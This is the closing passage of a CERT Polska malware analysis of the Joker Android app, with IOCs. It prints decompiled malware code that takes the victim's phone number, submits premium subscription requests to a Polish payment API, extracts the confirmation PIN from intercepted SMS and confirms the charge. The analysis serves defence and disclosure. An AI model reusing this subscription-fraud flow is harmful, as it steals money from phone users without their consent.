            <span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">C0023WYOdgBxH</span><span class="p">.</span><span class="na">KWHgxmAB</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// (str.equals(&quot;dump&quot;))</span>
                <span class="n">C0052BdnLopBC</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="n">C0028LfUtNUXX</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">f57TXbyafmq</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">WYOdgBxH2</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
</code></pre></div>


<p>At this point in the analysis, the malware is already able to automate interactions with subscription pages and intercept and record SMS messages. The final step is interaction with the pages in order to subscribe. This happens within the function <code>LfUtNUXX(String str)</code>.The function first attempts to retrieve the <code>MSISDN</code> (Mobile Station International Subscriber Directory Number) from the stored parameters:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">LfUtNUXX</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">String</span> <span class="n">str2</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="n">C0022TXbyafmq</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s">&quot;api2/&quot;</span><span class="p">,</span> <span class="s">&quot;/&quot;</span><span class="p">);</span>
        <span class="n">C0006TXbyafmq</span> <span class="n">WYOdgBxH3</span> <span class="o">=</span> <span class="k">new</span> <span class="n">C0005LfUtNUXX</span><span class="p">().</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">).</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;2_url:&quot;</span> <span class="o">+</span> <span class="n">WYOdgBxH3</span><span class="p">.</span><span class="na">f17LfUtNUXX</span><span class="p">);</span>
        <span class="n">String</span> <span class="n">str3</span> <span class="o">=</span> <span class="n">WYOdgBxH3</span><span class="p">.</span><span class="na">f17LfUtNUXX</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">str4</span> <span class="o">=</span> <span class="n">WYOdgBxH3</span><span class="p">.</span><span class="na">f17LfUtNUXX</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;2_t1:&quot;</span> <span class="o">+</span> <span class="n">str3</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;2_t2:&quot;</span> <span class="o">+</span> <span class="n">str4</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;2_prod:&quot;</span> <span class="o">+</span> <span class="n">WYOdgBxH2</span><span class="p">);</span>
        <span class="n">String</span> <span class="n">WYOdgBxH4</span> <span class="o">=</span> <span class="n">WYOdgBxH</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;2_msisdn:&quot;</span> <span class="o">+</span> <span class="n">WYOdgBxH4</span><span class="p">);</span>
        <span class="p">...</span>
</code></pre></div>


<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="n">String</span> <span class="nf">WYOdgBxH</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">C0055MdATElAc</span><span class="p">.</span><span class="na">C0056LfUtNUXX</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="s">&quot;pl_protocol&quot;</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">WYOdgBxH2</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isDigitsOnly</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">f110LfUtNUXX</span><span class="p">))</span> <span class="o">?</span> <span class="s">&quot;&quot;</span> <span class="p">:</span> <span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">f110LfUtNUXX</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div>


<ol>
<li>Retrieves a parameter named âpl_protocolâ from the context</li>
<li>Checks whether the value of the parameter consists of digits only (a valid phone number).</li>
<li>Returns <code>MSISDN</code> if available; otherwise returns an empty string.</li>
</ol>
<p>The malware then sends a transaction request using the obtained <code>MSISDN</code> and the rest of the required data, such as <code>TransactionId</code>(such is transmitted by C&amp;C as shown in the previous steps of the analysis):</p>
<div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">str7</span> <span class="o">=</span> <span class="s">&quot;https://epayment.teleaudio.pl/api2/typeundef_&quot;</span> <span class="o">+</span> <span class="n">WYOdgBxH2</span> <span class="o">+</span> <span class="s">&quot;/direct/proceed&quot;</span><span class="p">;</span>
<span class="n">String</span> <span class="n">str8</span> <span class="o">=</span> <span class="s">&quot;{\&quot;TransactionId\&quot;:\&quot;&quot;</span> <span class="o">+</span> <span class="n">str3</span> <span class="o">+</span> <span class="s">&quot;\&quot;,\&quot;Msisdn\&quot;:\&quot;&quot;</span> <span class="o">+</span> <span class="n">WYOdgBxH4</span> <span class="o">+</span> <span class="s">&quot;\&quot;,\&quot;Carrier\&quot;:\&quot;U\&quot;,\&quot;Consents\&quot;:null,\&quot;Connection\&quot;:\&quot;typeundef\&quot;}&quot;</span><span class="p">;</span>
<span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">.</span><span class="na">clear</span><span class="p">();</span>
<span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s">&quot;application/json&quot;</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">,</span> <span class="s">&quot;Bearer &quot;</span> <span class="o">+</span> <span class="n">str4</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;4_s5_url:&quot;</span> <span class="o">+</span> <span class="n">str7</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;4_s5_data:&quot;</span> <span class="o">+</span> <span class="n">str8</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">TXbyafmq</span><span class="p">();</span>
<span class="n">String</span> <span class="n">str9</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="k">new</span> <span class="n">C0005LfUtNUXX</span><span class="p">().</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">).</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str7</span><span class="p">,</span> <span class="n">str8</span><span class="p">.</span><span class="na">getBytes</span><span class="p">()).</span><span class="na">f18MdATElAc</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;5_s5_content:&quot;</span> <span class="o">+</span> <span class="n">str9</span><span class="p">);</span>
</code></pre></div>


<p>In the next step, if the request is successful, the application retrieves the code from the SMS(as we know from the previous steps, the application continuously retrieves and saves SMS messages), which is required to confirm the transaction:</p>
<div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">LfUtNUXX2</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">LfUtNUXX</span><span class="p">(</span><span class="s">&quot;2::(kod|PIN|code).*?(\\d{3,6})&quot;</span><span class="p">,</span> <span class="mi">30029</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;5_s5_pin:&quot;</span> <span class="o">+</span> <span class="n">LfUtNUXX2</span><span class="p">);</span>
</code></pre></div>


<p>Eventually, after acquiring the Pin code needed to approve the transaction, the malware sends a confirmation:</p>
<div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">str10</span> <span class="o">=</span> <span class="s">&quot;https://epayment.teleaudio.pl/api2/ta/direct/confirm&quot;</span><span class="p">;</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;5_s6_data:&quot;</span> <span class="o">+</span> <span class="p">(</span><span class="s">&quot;{\&quot;TransactionId\&quot;:\&quot;&quot;</span> <span class="o">+</span> <span class="n">str3</span> <span class="o">+</span> <span class="s">&quot;\&quot;,\&quot;Pin\&quot;:\&quot;&quot;</span> <span class="o">+</span> <span class="n">LfUtNUXX2</span> <span class="o">+</span> <span class="s">&quot;\&quot;,\&quot;Consents\&quot;:null}&quot;</span><span class="p">));</span>
<span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;6_s6_content:&quot;</span> <span class="o">+</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="k">new</span> <span class="n">C0005LfUtNUXX</span><span class="p">().</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">).</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str10</span><span class="p">,</span> <span class="n">str2</span><span class="p">.</span><span class="na">toString</span><span class="p">().</span><span class="na">getBytes</span><span class="p">()).</span><span class="na">f18MdATElAc</span><span class="p">));</span>
</code></pre></div>


<p>Once the transaction is approved, it checks its status and verifies that the subscription went through successfully:</p>
<div class="highlight"><pre><span></span><code> <span class="n">String</span> <span class="n">str11</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="k">new</span> <span class="n">C0005LfUtNUXX</span><span class="p">().</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">f51LfUtNUXX</span><span class="p">).</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="s">&quot;https://epayment.teleaudio.pl/api2/ta/direct/status/&quot;</span> <span class="o">+</span> <span class="n">str3</span><span class="p">).</span><span class="na">f18MdATElAc</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f52WYOdgBxH</span><span class="p">.</span><span class="na">BdnLopBC</span><span class="p">(</span><span class="s">&quot;7_s7_content:&quot;</span> <span class="o">+</span> <span class="n">str11</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">str11</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;Transakcja zakoÅczona pomyÅlnie.&quot;</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">WYOdgBxH</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">WYOdgBxH</span><span class="p">(</span><span class="mi">903</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div>


<h2>Summary</h2>
<p>Comprehensive analysis of the app's behavior has revealed a sophisticated and malicious mechanism designed to get users to subscribe to premium services without their knowledge or consent. The application uses a multi-step process that employs encrypted communications, obfuscated code and unauthorized access to sensitive user data. By analyzing each component and understanding the flow of operations, we can conclude that the application poses a serious threat to users' security, privacy and finances.</p>
<h2>IOC</h2>
<div class="highlight"><pre><span></span><code><span class="n">MD5</span>
<span class="n">Stage</span> <span class="n">one</span><span class="p">:</span>
<span class="mi">1</span><span class="n">ad4d8037d6890f317dc28bb53c1eb03</span> <span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="n">onmybeauty</span><span class="p">.</span><span class="n">beautycamera</span><span class="p">.</span><span class="n">apk</span> <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">play</span><span class="p">.</span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">store</span><span class="o">/</span><span class="n">apps</span><span class="o">/</span><span class="n">details</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="n">com</span><span class="p">.</span><span class="n">onmybeauty</span><span class="p">.</span><span class="n">beautycamera</span><span class="p">)</span>
<span class="n">Stage</span> <span class="n">two</span><span class="p">:</span>
<span class="n">f508a96654c355b8bd575f8d8ed8a157</span> <span class="o">-</span> <span class="n">decoded_kuwan</span><span class="p">.</span><span class="n">dex</span>
<span class="n">kamisatu</span><span class="p">[.]</span><span class="n">top</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">forga</span><span class="p">.</span><span class="n">oss</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="p">.</span><span class="n">aliyuncs</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">Kuwan</span>

<span class="n">Other</span> <span class="n">related</span> <span class="n">samples</span> <span class="k">from</span> <span class="n">the</span> <span class="n">Joker</span> <span class="n">campaign</span> <span class="k">in</span> <span class="n">recent</span> <span class="n">days</span><span class="p">:</span>
<span class="mi">962</span><span class="n">c0590dd3d2cdb707e32ae8b30bcfc</span> <span class="p">(</span><span class="n">xapk</span> <span class="k">version</span> <span class="k">with</span> <span class="n">photolibrary</span><span class="p">.</span><span class="n">so</span> <span class="n">included</span><span class="p">)</span>
<span class="n">bcfe46df4d66cc3c6f92d281ceac53e1</span>
<span class="mi">5942</span><span class="n">a2e46b29ddc1dd5d9373a8c419ad</span>
<span class="mi">62</span><span class="n">d9b7cff4a09d7c3b7e8bcf9d00d196</span>
</code></pre></div>
                </div>

                    <div class="sharebox">
                            Share:

                            <a class="reddit" href="https://www.reddit.com/submit?url=https%3A//cert.pl/en/posts/2024/10/analiza-joker/&title=The%20Dark%20Knight%20Returns%3A%20Joker%20malware%20analysis"><img class="sprite-reddit-share-icon" src="/theme/assets/img/img.gif"/></a>
                        <a class="twitter" href="https://twitter.com/intent/tweet?text=The%20Dark%20Knight%20Returns%3A%20Joker%20malware%20analysis&url=https%3A//cert.pl/en/posts/2024/10/analiza-joker/&hashtags=joker,analysis,android"><img class="sprite-twitter-share-icon" src="/theme/assets/img/img.gif"/></a>
                        <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A//cert.pl/en/posts/2024/10/analiza-joker/"><img class="sprite-facebook-share-icon" src="/theme/assets/img/img.gif"/></a>
                        <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A//cert.pl/en/posts/2024/10/analiza-joker/&title=The%20Dark%20Knight%20Returns%3A%20Joker%20malware%20analysis&summary=CERT%20Polska%20has%20recently%20observed%20new%20samples%20of%20the%20%E2%80%9CJoker%E2%80%9D%20mobile%20malware.%20The%20applications%20are%20present%20in%20the%20Google%20Play%20Store%20and%20target%20Polish%20users%2C%20among%20others.&source=https%3A//cert.pl/en/posts/2024/10/analiza-joker/"><img class="sprite-linkedin-share-icon" src="/theme/assets/img/img.gif"/></a>
                    </div>
            </div>
        </div>
    </div>

<footer>
        <div class="footer-main">
            <div class="footer-main-wrapper">
                <div class="grid-x grid-padding-x">
                    <div class="large-4 medium-4 small-12 cell">
                        <div class="small-logo"></div>
                        <p>The CERT Polska team operates within the structures of NASK (Research and Academic Computer
                            Network) â
                            a research institute which conducts scientific studies, operates the national .pl domain
                            registry
                            and provides advanced IT services.</p>
                    </div>
                    <div class="socialmedia large-5 medium-5 small-12 cell">
                        <h1>Social media</h1>
                        <a href="https://www.facebook.com/CERT.Polska/"><img class="sprite-facebook-icon"
                                                                             src="/theme/assets/img/img.gif"
                                                                             aria-hidden="true"/>Facebook</a>
                        <a href="https://twitter.com/CERT_Polska_en"><img class="sprite-twitter-icon"
                                                                          src="/theme/assets/img/img.gif"
                                                                          aria-hidden="true"/>Twitter</a>
                        <a href="https://github.com/CERT-Polska"><img class="sprite-github-icon"
                                                                      src="/theme/assets/img/img.gif"
                                                                      aria-hidden="true"/>GitHub</a>
                    </div>
                    <div class="contact large-3 medium-3 small-12 cell text-right">
                        <h1>Contact</h1>
                        <p>
                            ul. Kolska 12, PL-01-045 Warsaw, Poland<br/>
                            tel.: +48 22 380 82 74<br/>
                            fax: +48 22 380 83 99<br/>
                            ePUAP: /NASK-Instytut/SkrytkaESP<br/>
                            <br/>
                            E-mail: <a href="/cdn-cgi/l/email-protection#224b4c444d62414750560c524e"><span class="__cf_email__" data-cfemail="21484f474e61424453550f514d">[email&#160;protected]</span></a><br/>
                            Incidents: <a href="/cdn-cgi/l/email-protection#90f3f5e2e4d0f3f5e2e4bee0fc"><span class="__cf_email__" data-cfemail="630006111723000611174d130f">[email&#160;protected]</span></a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-bottom">
            <div class="footer-bottom-wrapper">
                <div class="float-left">
                    <img src="/theme/assets/img/ue-en.png"
                         alt="Co-financed by the Connecting Europe Facility of The European Union"/>
                </div>
                <div class="footer-bottom-right float-right">
                    <ul class="menu">
                        <li>Â© 2024 <a href="https://nask.pl/">NASK</a></li>
                        <li><a href="/uploads/misc/privacy-policy-en.pdf">Privacy policy</a></li>
                        <li><a href="https://csirt.gov.pl/">CSIRT GOV</a></li>
                        <li><a href="https://csirt-mon.wp.mil.pl/">CSIRT MON</a></li>
                    </ul>
                </div>
            </div>
        </div>
</footer>


<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>